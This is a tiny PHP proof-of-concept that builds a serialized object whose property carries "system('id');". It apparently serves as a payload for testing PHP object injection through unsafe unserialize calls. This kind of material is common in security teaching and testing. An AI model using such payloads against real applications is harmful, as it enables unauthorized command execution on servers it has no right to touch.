<?php 
class PHPObjectInjection
{
            public $inject="system('id');";
}
$obj=new  PHPObjectInjection();
var_dump(serialize($obj));
?>
